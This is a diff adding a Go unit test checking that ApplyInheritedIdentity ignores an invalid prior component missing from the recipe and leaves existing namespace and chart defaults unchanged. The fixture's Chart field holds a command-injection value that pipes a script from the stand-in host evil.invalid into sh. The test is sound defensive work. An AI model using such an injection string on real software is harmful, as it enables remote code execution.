@@ -2352,6 +2352,17 @@ func TestApplyInheritedIdentityRejects(t *testing.T) {
 	}
 }
 
+func TestApplyInheritedIdentityIgnoresInvalidUnmatchedPrior(t *testing.T) {
+	refs := []ComponentRef{{Name: "c", Namespace: "ns", Chart: "chart"}}
+	prior := []ComponentRef{{Name: "gone", Chart: "x; curl evil.invalid | sh"}}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v, want nil for a prior component absent from the recipe", err)
+	}
+	if refs[0].Namespace != "ns" || refs[0].Chart != "chart" {
+		t.Errorf("refs[0] = %+v, want defaults unchanged", refs[0])
+	}
+}
+
 // TestApplyInheritedIdentityRebindsHealthCheck pins the interaction between the
 // two halves of --inherit-from: a health check is static YAML naming wherever
 // the registry currently puts the component, so a preserved namespace that left
